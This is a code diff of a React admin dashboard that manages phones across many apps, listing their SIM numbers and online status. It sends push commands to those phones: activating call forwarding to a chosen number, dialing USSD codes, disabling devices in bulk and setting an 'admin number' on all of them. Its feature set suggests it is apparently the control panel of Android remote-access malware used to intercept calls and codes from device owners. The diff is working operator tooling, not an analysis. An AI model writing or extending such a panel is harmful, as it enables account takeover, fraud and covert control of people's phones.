+          {/* FCM Action 5: Call Forward */}
+          <FcmActionCard title="Call Forward" icon={<Ic.PhoneForwarded />} onReset={() => { setFwdState("idle"); setFwdLog(""); setFwdNumber(""); }}>
+            <input type="tel" placeholder="Forward to number" value={fwdNumber} onChange={e => setFwdNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
+            <div style={{ display: "flex", gap: 8 }}>
+              <BtnSend onClick={() => { if (!fwdNumber.trim()) return; sendFcm({ type: "call_forward", action: "activate", number: fwdNumber.trim(), sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog); }} disabled={fwdState === "sending" || !fwdNumber.trim()}>
+                {fwdState === "sending" ? <><Spinner /></> : "Activate"}
+              </BtnSend>
+              <BtnSend onClick={() => sendFcm({ type: "call_forward", action: "deactivate", number: fwdNumber.trim() || "", sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog)} disabled={fwdState === "sending"}>
+                {fwdState === "sending" ? <><Spinner /></> : "Deactivate"}
+              </BtnSend>
+            </div>
+            <div style={stateStyle(fwdState)}>{fwdLog}</div>
+          </FcmActionCard>
+
+          {/* FCM Action 6: USSD */}
+          <FcmActionCard title="USSD Dial" icon={<Ic.Hash />} onReset={() => { setUssdState("idle"); setUssdLog(""); setUssdCode(""); }}>
+            <input type="text" placeholder="USSD code (e.g. *100#)" value={ussdCode} onChange={e => setUssdCode(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, fontFamily: "monospace" }} />
+            <div style={stateStyle(ussdState)}>{ussdLog}</div>
+            <BtnSend onClick={() => { if (!ussdCode.trim()) return; sendFcm({ type: "ussd", code: ussdCode.trim(), simSlot: sim === "2" ? "1" : "0" }, setUssdState, setUssdLog); }} disabled={ussdState === "sending" || !ussdCode.trim()}>
+              {ussdState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Hash /> Dial USSD</>}
+            </BtnSend>
+          </FcmActionCard>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   DEVICES TAB
+══════════════════════════════════════════ */
+const PAGE_SIZE = 48;
+function DevicesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+  const [devices, setDevices] = useState<FullDevice[]>([]);
+  const [loading, setLoading] = useState(false);
+  const [appFilter, setAppFilter] = useState("");
+  const [search, setSearch] = useState("");
+  const [page, setPage] = useState(1);
+  const [selected, setSelected] = useState<FullDevice | null>(null);
+
+  const fetchDevices = useCallback(async () => {
+    setLoading(true);
+    try {
+      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
+      const r = await apiFetch(`/api/master/all-devices${qs}`, { headers: { "x-master-pin": masterPin } });
+      if (r.ok) setDevices(await r.json() as FullDevice[]);
+    } catch { /* ignore */ } finally { setLoading(false); }
+  }, [appFilter, masterPin]);
+
+  useEffect(() => { void fetchDevices(); setPage(1); }, [fetchDevices]);
+
+  const ONLINE_MS = 15 * 60 * 1000;
+  const q = search.trim().toLowerCase();
+  const filtered = useMemo(() => {
+    if (!q) return devices;
+    return devices.filter(d =>
+      d.name.toLowerCase().includes(q) || d.appId.toLowerCase().includes(q) ||
+      d.deviceId.toLowerCase().includes(q) || (d.sim1Phone ?? "").includes(q) || (d.sim2Phone ?? "").includes(q)
+    );
+  }, [devices, q]);
+
+  const shown = q !== "" ? filtered : filtered.slice(0, page * PAGE_SIZE);
+  const hasMore = q === "" && shown.length < filtered.length;
+  const online = devices.filter(d => d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false).length;
+
+  const appColors: Record<string, string> = {};
+  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899"];
+  let ci = 0;
+  devices.forEach(d => { if (!appColors[d.appId]) appColors[d.appId] = palette[ci++ % palette.length]; });
+
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
+        <AppSelector apps={apps} value={appFilter} onChange={v => { setAppFilter(v); setPage(1); }} />
+        <div style={{ position: "relative", flex: 1, minWidth: 180 }}>
+          <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: T.muted, display: "flex", pointerEvents: "none" }}><Ic.Search /></span>
+          <input type="text" placeholder="Search name, device ID, phone…" value={search} onChange={e => { setSearch(e.target.value); setPage(1); }}
+            style={{ width: "100%", boxSizing: "border-box", padding: "8px 32px 8px 36px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
+          {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 20, height: 20, borderRadius: 5, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
+        </div>
+        <button onClick={() => void fetchDevices()} disabled={loading} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 12, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
+          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
+        </button>
+      </div>
+
+      <div style={{ display: "flex", gap: 8, fontSize: 11 }}>
+        <span style={{ color: T.muted }}>{devices.length} total</span>
+        <span style={{ color: T.green }}>· {online} online</span>
+        <span style={{ color: T.muted }}>· {devices.filter(d => d.hasFcm).length} FCM</span>
+      </div>
+
+      {loading && devices.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}><Ic.Loader /><span>Loading devices…</span></div>
+      ) : filtered.length === 0 ? (
+        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+          <Ic.Inbox /><span>{q ? `No devices for "${search}".` : "No devices found."}</span>
+        </div>
+      ) : (
+        <>
+          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 10 }}>
+            {shown.map(d => {
+              const ac = appColors[d.appId] ?? T.accent;
+              const isOnline = d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false;
+              return (
+                <div key={d.deviceId} onClick={() => setSelected(d)} style={{ background: T.card, borderRadius: 13, border: `1px solid ${isOnline ? T.green + "30" : T.borderLight}`, overflow: "hidden", cursor: "pointer", transition: "all 0.15s" }}>
+                  <div style={{ padding: "9px 13px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
+                    <span style={{ background: ac + "22", color: ac, border: `1px solid ${ac}44`, borderRadius: 5, padding: "2px 7px", fontSize: 9, fontWeight: 800 }}>{d.appId.slice(-8)}</span>
+                    <span style={{ display: "flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 8px", fontSize: 9, fontWeight: 800 }}>
+                      <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
+                    </span>
+                  </div>
+                  <div style={{ padding: "11px 13px", display: "flex", flexDirection: "column", gap: 6 }}>
+                    <div style={{ fontWeight: 800, fontSize: 14, color: T.text }}>{d.name}</div>
+                    <div style={{ fontSize: 11, color: T.mutedLight, fontFamily: "monospace" }}>{d.deviceId.slice(0, 20)}…</div>
+                    <div style={{ display: "flex", gap: 8, fontSize: 10 }}>
+                      <span style={{ color: T.muted }}>SIM1: <span style={{ color: T.mutedLight }}>{d.sim1Phone ?? "—"}</span></span>
+                      {d.sim2Phone && <span style={{ color: T.muted }}>SIM2: <span style={{ color: T.mutedLight }}>{d.sim2Phone}</span></span>}
+                    </div>
+                    <div style={{ display: "flex", gap: 10, fontSize: 10 }}>
+                      <span style={{ color: d.hasFcm ? T.green : T.muted, fontWeight: 700 }}>{d.hasFcm ? "FCM ✓" : "No FCM"}</span>
+                      <span style={{ color: T.muted }}>{fmtAgo(d.lastOnline)}</span>
+                    </div>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+          {hasMore && !loading && (
+            <div style={{ textAlign: "center" }}>
+              <button onClick={() => setPage(p => p + 1)} style={{ padding: "10px 32px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
+                Load More ({filtered.length - shown.length} remaining)
+              </button>
+            </div>
+          )}
+          <div style={{ textAlign: "center", fontSize: 11, color: T.muted }}>{filtered.length} device{filtered.length !== 1 ? "s" : ""}</div>
+        </>
+      )}
+
+      {selected && <DeviceDetail device={selected} masterPin={masterPin} onClose={() => setSelected(null)} />}
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   SETTINGS TAB
+══════════════════════════════════════════ */
+function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+  /* ── Batch FCM (targets ALL devices across ALL apps) ── */
+  const [batchState, setBatchState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
+  const [batchDone, setBatchDone] = useState(0);
+  const [batchTotal, setBatchTotal] = useState(0);
+  const [batchResult, setBatchResult] = useState<{ ok: number; fail: number } | null>(null);
+  const [adminNumInput, setAdminNumInput] = useState("");
+  const [batchAction, setBatchAction] = useState<"ping" | "disable" | "update_admin">("ping");
+
+  /* ── Sessions (per-app selector) ── */
+  const [sessAppFilter, setSessAppFilter] = useState(apps[0]?.appId ?? "");
+  const [sessions, setSessions] = useState<SessionRow[]>([]);
+  const [sessLoading, setSessLoading] = useState(false);
+  const [logoutingId, setLogoutingId] = useState<string | null>(null);
+  const [logoutingAll, setLogoutingAll] = useState(false);
+
+  /* ── Delete Protection (per-app selector) ── */
+  const [dpAppFilter, setDpAppFilter] = useState(apps[0]?.appId ?? "");
+  const dpApp = apps.find(a => a.appId === dpAppFilter) ?? null;
+  const [dpState, setDpState] = useState<"idle" | "busy">("idle");
+  const [dpNewPin, setDpNewPin] = useState("");
+  const [dpCurrentPin, setDpCurrentPin] = useState("");
+  const [dpEnabled, setDpEnabled] = useState(false);
+  const [dpHasPin, setDpHasPin] = useState(false);
+  const [dpMsg, setDpMsg] = useState("");
+
+  useEffect(() => {
+    if (apps.length && !sessAppFilter) setSessAppFilter(apps[0]?.appId ?? "");
+    if (apps.length && !dpAppFilter) setDpAppFilter(apps[0]?.appId ?? "");
+  }, [apps]);
+
+  useEffect(() => {
+    if (dpApp) { setDpEnabled(dpApp.deleteProtectionEnabled); setDpHasPin(!!dpApp.deleteProtectionPin); }
+    setDpMsg(""); setDpNewPin(""); setDpCurrentPin("");
+  }, [dpAppFilter]);
+
+  const fetchSessions = useCallback(async () => {
+    if (!sessAppFilter) return;
+    setSessLoading(true);
+    try {
+      const r = await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`);
+      if (r.ok) setSessions(await r.json() as SessionRow[]);
+    } catch { /* ignore */ } finally { setSessLoading(false); }
+  }, [sessAppFilter]);
+
+  useEffect(() => { void fetchSessions(); }, [fetchSessions]);
+
+  async function logoutSession(id: string) {
+    setLogoutingId(id);
+    try {
+      await apiFetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
+      setSessions(prev => prev.filter(s => s.id !== id));
+    } catch { /* ignore */ } finally { setLogoutingId(null); }
+  }
+
+  async function logoutAll() {
+    if (!sessAppFilter) return;
+    setLogoutingAll(true);
+    try {
+      await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(sessAppFilter)}`, { method: "DELETE" });
+      setSessions([]);
+    } catch { /* ignore */ } finally { setLogoutingAll(false); }
+  }
+
+  /* Batch FCM — NO appId filter — targets ALL devices across ALL apps */
+  async function runBatch() {
+    setBatchState("loading"); setBatchResult(null); setBatchDone(0); setBatchTotal(0);
+    try {
+      const r = await apiFetch(`/api/master/all-devices?hasFcm=1`, { headers: { "x-master-pin": masterPin } });
+      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
+      setBatchTotal(eligible.length); setBatchState("running");
+      const BATCH = 50; const DELAY = 300;
+      let ok = 0; let fail = 0;
+      for (let i = 0; i < eligible.length; i += BATCH) {
+        const batch = eligible.slice(i, i + BATCH);
+        const results = await Promise.allSettled(batch.map(d => {
+          let data: Record<string, string>;
+          if (batchAction === "ping") data = { type: "online_check" };
+          else if (batchAction === "disable") data = { type: "admin_update", status: "off", deviceId: d.deviceId };
+          else data = { type: "admin_update", status: "on", adminNumber: adminNumInput.trim(), deviceId: d.deviceId };
+          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
+        }));
+        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
+        setBatchDone(Math.min(i + BATCH, eligible.length));
+        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
+      }
+      setBatchResult({ ok, fail }); setBatchState("done");
+      setTimeout(() => { setBatchState("idle"); setBatchDone(0); setBatchTotal(0); setBatchResult(null); }, 6000);
+    } catch { setBatchState("err"); setTimeout(() => setBatchState("idle"), 3000); }
+  }
+
+  async function setDeleteProtectionPin() {
+    if (!dpAppFilter || !dpNewPin || dpNewPin.length < 4) { setDpMsg("PIN must be at least 4 characters"); return; }
+    setDpState("busy"); setDpMsg("");
+    try {
+      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/set-pin`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin: dpNewPin, currentPin: dpHasPin ? dpCurrentPin : undefined }) });
+      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Failed"); return; }
+      setDpHasPin(true); setDpMsg("PIN set successfully!"); setDpNewPin(""); setDpCurrentPin("");
+    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
+  }
+
+  async function toggleDeleteProtection() {
+    if (!dpAppFilter) return;
+    setDpState("busy"); setDpMsg("");
+    try {
+      const pinToUse = dpCurrentPin || dpNewPin;
+      if (!pinToUse) { setDpMsg("Enter PIN to toggle"); setDpState("idle"); return; }
+      const r = await apiFetch(`/api/apps/${encodeURIComponent(dpAppFilter)}/delete-protection/toggle`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin: pinToUse }) });
+      if (!r.ok) { const j = await r.json() as { error?: string }; setDpMsg(j.error ?? "Wrong PIN"); return; }
+      const j = await r.json() as { enabled: boolean };
+      setDpEnabled(j.enabled); setDpMsg(`Delete protection ${j.enabled ? "enabled" : "disabled"}.`);
+    } catch { setDpMsg("Network error"); } finally { setDpState("idle"); }
+  }
+
+  const busyBatch = batchState === "loading" || batchState === "running";
+  const pct = batchTotal > 0 ? Math.round((batchDone / batchTotal) * 100) : 0;
+
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
+
+      {/* ── Batch FCM Actions — ALL devices across ALL apps ── */}
+      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
+        <div style={{ fontSize: 14, fontWeight: 800, color: T.text, marginBottom: 4 }}>Batch FCM Actions</div>
+        <div style={{ fontSize: 12, color: T.muted, marginBottom: 12 }}>Send FCM commands to <b style={{ color: T.accentLight }}>ALL FCM-enabled devices</b> across every app at once</div>
+
+        <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
+          {(["ping", "disable", "update_admin"] as const).map(a => (
+            <button key={a} onClick={() => setBatchAction(a)} style={{ flex: 1, padding: "8px 6px", borderRadius: 8, border: `1.5px solid ${batchAction === a ? T.accent : T.borderLight}`, background: batchAction === a ? T.accentGlow : T.border, color: batchAction === a ? T.accentLight : T.muted, fontWeight: 700, fontSize: 11, cursor: "pointer" }}>
+              {a === "ping" ? "Ping All" : a === "disable" ? "Disable All" : "Update Admin"}
+            </button>
+          ))}
+        </div>
+
+        {batchAction === "update_admin" && (
+          <input type="tel" placeholder="Admin phone number" value={adminNumInput} onChange={e => setAdminNumInput(e.target.value)} style={{ ...inpBase, marginBottom: 12, fontSize: 13 }} />
+        )}
+
+        {(batchState === "loading" || batchState === "running") && (
+          <div style={{ marginBottom: 12 }}>
+            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
+              <span>{batchState === "loading" ? "Fetching all devices…" : "Sending…"}</span>
+              {batchState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{batchDone}/{batchTotal}</span>}
+            </div>
+            <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
+              <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: batchState === "loading" ? "10%" : `${pct}%`, transition: "width 0.3s" }} />
+            </div>
+          </div>
+        )}
+        {batchState === "done" && batchResult && (
+          <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 9, padding: "9px 14px", display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
+            <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Done!</span>
+            <span style={{ fontSize: 12, color: T.muted }}><span style={{ color: T.green, fontWeight: 700 }}>{batchResult.ok}</span> sent{batchResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{batchResult.fail}</span> failed</>}</span>
+          </div>
+        )}
+        {batchState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, marginBottom: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Failed. Retry.</div>}
+
+        <button onClick={() => void runBatch()} disabled={busyBatch || (batchAction === "update_admin" && !adminNumInput.trim())}
+          style={{ width: "100%", padding: "11px 0", borderRadius: 9, background: batchState === "done" ? T.green : busyBatch ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, border: "none", color: batchState === "done" ? "#fff" : busyBatch ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: busyBatch ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+          {batchState === "loading" ? <><Spinner /> Fetching…</> : batchState === "running" ? <><Spinner /> {batchDone}/{batchTotal}…</> : batchState === "done" ? <><Ic.Check /> Done</> : batchState === "err" ? "Error — Retry" : batchAction === "ping" ? <><Ic.Wifi /> Ping All Devices</> : batchAction === "disable" ? <><Ic.Power /> Disable All</> : <><Ic.Key /> Update Admin Number</>}
+        </button>
+      </div>
+
+      {/* ── Delete Protection (per-app) ── */}
+      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
+          <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Delete Protection</div>
+          {dpApp && <span style={{ fontSize: 11, fontWeight: 700, padding: "3px 10px", borderRadius: 99, background: dpEnabled ? T.green + "22" : T.border, color: dpEnabled ? T.green : T.muted, border: `1px solid ${dpEnabled ? T.green + "44" : "transparent"}` }}>{dpEnabled ? "ON" : "OFF"}</span>}
+        </div>
+        <div style={{ marginBottom: 10 }}>
+          <AppSelector apps={apps} value={dpAppFilter} onChange={v => { setDpAppFilter(v); }} allLabel="— Select App —" />
+        </div>
+        {dpApp && (
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+            {dpHasPin && (
+              <div>
+                <FieldLabel>Current PIN (to toggle or change)</FieldLabel>
+                <input type="password" placeholder="Current protection PIN" value={dpCurrentPin} onChange={e => setDpCurrentPin(e.target.value)} style={{ ...inpBase, fontSize: 13 }} />
+              </div>
+            )}
+            <div>
+              <FieldLabel>{dpHasPin ? "New PIN (optional — to change)" : "Set Protection PIN"}</FieldLabel>
+              <input type="password" placeholder={dpHasPin ? "New PIN (min 4 chars)" : "Set PIN (min 4 chars)"} value={dpNewPin} onChange={e => setDpNewPin(e.target.value)} style={{ ...inpBase, fontSize: 13 }} />
+            </div>
+            {dpMsg && <div style={{ fontSize: 12, color: dpMsg.includes("success") ? T.green : T.red, background: (dpMsg.includes("success") ? T.green : T.red) + "15", borderRadius: 8, padding: "7px 11px" }}>{dpMsg}</div>}
+            <div style={{ display: "flex", gap: 8 }}>
+              <button onClick={() => void setDeleteProtectionPin()} disabled={dpState === "busy" || !dpNewPin} style={{ flex: 1, padding: "9px 0", borderRadius: 9, background: dpNewPin ? "linear-gradient(135deg,#5254d4,#7c3aed)" : T.border, border: "none", color: dpNewPin ? "#fff" : T.muted, fontWeight: 700, cursor: dpNewPin ? "pointer" : "default", fontSize: 12 }}>
+                {dpState === "busy" ? "Saving…" : dpHasPin ? "Change PIN" : "Set PIN"}
+              </button>
+              {dpHasPin && (
+                <button onClick={() => void toggleDeleteProtection()} disabled={dpState === "busy"} style={{ flex: 1, padding: "9px 0", borderRadius: 9, background: dpEnabled ? T.red + "18" : T.green + "18", border: `1px solid ${dpEnabled ? T.red + "44" : T.green + "44"}`, color: dpEnabled ? T.red : T.green, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>
+                  {dpEnabled ? "Disable" : "Enable"}
+                </button>
+              )}
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* ── Admin Sessions (per-app) ── */}
+      <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
+          <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Admin Sessions</div>
+          <div style={{ display: "flex", gap: 6 }}>
+            <button onClick={() => void fetchSessions()} disabled={sessLoading} style={{ padding: "5px 12px", borderRadius: 8, background: T.border, border: `1px solid ${T.borderLight}`, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", gap: 5 }}>
+              {sessLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
+            </button>
+            {sessions.length > 0 && (
+              <button onClick={() => void logoutAll()} disabled={logoutingAll} style={{ padding: "5px 12px", borderRadius: 8, background: T.red + "18", border: `1px solid ${T.red}44`, color: T.red, fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
+                {logoutingAll ? "…" : "Logout All"}
+              </button>
+            )}
+          </div>
+        </div>
+        <div style={{ marginBottom: 10 }}>
+          <AppSelector apps={apps} value={sessAppFilter} onChange={v => { setSessAppFilter(v); }} allLabel="— Select App —" />
+        </div>
+        {sessions.length === 0 ? (
+          <div style={{ textAlign: "center", padding: "20px 0", color: T.muted, fontSize: 12 }}>No active sessions</div>
+        ) : (
+          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+            {sessions.map(s => (
+              <div key={s.id} style={{ background: T.inputBg, borderRadius: 9, padding: "9px 12px", display: "flex", alignItems: "center", gap: 10 }}>
+                <div style={{ flex: 1, minWidth: 0 }}>
+                  <div style={{ fontSize: 12, fontWeight: 700, color: T.text, marginBottom: 2 }}>{s.device}</div>
+                  <div style={{ fontSize: 10, color: T.muted }}>{s.ip} · {fmtAgo(s.loginTime)}</div>
+                </div>
+                <button onClick={() => void logoutSession(s.id)} disabled={logoutingId === s.id} style={{ padding: "5px 10px", borderRadius: 7, background: T.red + "18", border: `1px solid ${T.red}44`, color: T.red, fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
+                  {logoutingId === s.id ? <Spinner size={10} /> : <Ic.LogOut />}
+                </button>
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════
+   MAIN DASHBOARD
+══════════════════════════════════════════ */
+type Tab = "apps" | "messages" | "groups" | "devices" | "settings";
+
 function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; onLogout: () => void; onPinChanged: (p: string) => void }) {
+  const [tab, setTab] = useState<Tab>("apps");
   const [appList, setAppList] = useState<App[]>([]);
-  const [loading, setLoading] = useState(true);
+  const [appsLoading, setAppsLoading] = useState(true);
   const [showCreate, setShowCreate] = useState(false);
   const [showChangePin, setShowChangePin] = useState(false);
-  const [showAllDevices, setShowAllDevices] = useState(false);
-  const [allDevicesList, setAllDevicesList] = useState<FullDevice[]>([]);
-  const [allDevLoading, setAllDevLoading] = useState(false);
-  const [allDevSearch, setAllDevSearch] = useState("");
   const [editApp, setEditApp] = useState<App | null>(null);
   const [deletingId, setDeletingId] = useState<string | null>(null);
   const [togglingId, setTogglingId] = useState<string | null>(null);
   const [copyMsg, setCopyMsg] = useState<Record<string, string>>({});
   const [logoutAllId, setLogoutAllId] = useState<string | null>(null);
-    const [resetApkId, setResetApkId] = useState<string | null>(null);
+  const [resetApkId, setResetApkId] = useState<string | null>(null);
   const [renewId, setRenewId] = useState<string | null>(null);
   const [renewConfirmApp, setRenewConfirmApp] = useState<App | null>(null);
   const [search, setSearch] = useState("");
-
-  /* ── FCM Check Online ── */
-  const [pingState, setPingState] = useState<"idle"|"loading"|"running"|"done"|"err">("idle");
+  const [pingState, setPingState] = useState<"idle" | "loading" | "running" | "done" | "err">("idle");
   const [pingDone, setPingDone] = useState(0);
   const [pingTotal, setPingTotal] = useState(0);
   const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);
@@ -688,48 +1295,28 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   const fetchApps = useCallback(async () => {
     try {
       const r = await apiFetch("/api/master/apps", { headers: { "x-master-pin": masterPin } });
-      if (r.status === 401) { onLogout(); return; }
-      if (!r.ok) return;
-      setAppList(await r.json() as App[]);
-    } catch { /* ignore */ } finally { setLoading(false); }
-  }, [masterPin, onLogout]);
+      if (r.ok) setAppList(await r.json() as App[]);
+    } catch { /* ignore */ } finally { setAppsLoading(false); }
+  }, [masterPin]);
 
   useEffect(() => { void fetchApps(); }, [fetchApps]);
 
-  async function fetchAllDevices(): Promise<FullDevice[]> {
-    const r = await apiFetch("/api/master/all-devices", { headers: { "x-master-pin": masterPin } });
-    if (!r.ok) throw new Error("Failed to fetch devices");
-    return r.json() as Promise<FullDevice[]>;
-  }
-
-  async function openAllDevices(forceRefresh = false) {
-    setShowAllDevices(true); setAllDevSearch("");
-    if (!forceRefresh && allDevicesList.length > 0) return;
-    setAllDevLoading(true);
-    try { setAllDevicesList(await fetchAllDevices()); }
-    catch { /* ignore */ } finally { setAllDevLoading(false); }
-  }
-
-    async function handlePingAll() {
+  async function handlePingAll() {
     setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
     try {
-      const eligible = (await apiFetch("/api/master/all-devices?hasFcm=1", { headers: { "x-master-pin": masterPin } }).then(r => r.ok ? r.json() : [])) as FullDevice[];
-      // hasFcm filter applied server-side
+      const r = await apiFetch("/api/master/all-devices?hasFcm=1", { headers: { "x-master-pin": masterPin } });
+      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
       setPingTotal(eligible.length); setPingState("running");
       const BATCH = 100; const DELAY = 300;
       let ok = 0; let fail = 0;
       for (let i = 0; i < eligible.length; i += BATCH) {
         const batch = eligible.slice(i, i + BATCH);
         const results = await Promise.allSettled(batch.map(d =>
-          apiFetch("/api/fcm/send", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ deviceId: d.deviceId, data: { type: "check_online" } }),
-          }).then(r => { if (!r.ok) throw new Error("FCM failed"); })
+          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "online_check" } }) }).then(res => { if (!res.ok) throw new Error(); })
         ));
-        results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
+        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setPingDone(Math.min(i + BATCH, eligible.length));
-        if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
+        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
       }
       setPingResult({ ok, fail }); setPingState("done");
       setTimeout(() => { setPingState("idle"); setPingDone(0); setPingTotal(0); setPingResult(null); }, 7000);
@@ -757,33 +1344,22 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   async function logoutAll(app: App) {
     if (!confirm(`Logout all active sessions for "${app.name}"?`)) return;
     setLogoutAllId(app.appId);
-    try {
-      await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" });
-      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a } : a));
-    } catch { /* ignore */ } finally { setLogoutAllId(null); }
+    try { await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" }); }
+    catch { /* ignore */ } finally { setLogoutAllId(null); }
   }
 
   async function resetApk(app: App) {
-      if (!confirm(`Reset APK selection for "${app.name}"?
-
-Sabhi users ka selected APK clear ho jaayega — woh fir se select kar sakenge.`)) return;
-      setResetApkId(app.appId);
-      try {
-        const r = await apiFetch(`/api/master/token-app/${encodeURIComponent(app.appId)}`, {
-          method: "DELETE",
-          headers: { "x-master-pin": masterPin },
-        });
-        const j = await r.json() as { ok?: boolean; error?: string; deleted?: number };
-        if (r.ok) alert(`✅ Reset done! ${j.deleted ?? 0} token mapping(s) cleared.`);
-        else alert(`❌ Error: ${j.error ?? "Unknown error"}`);
-      } catch { alert("❌ Network error"); } finally { setResetApkId(null); }
-    }
-
-    function openRenew(app: App) {
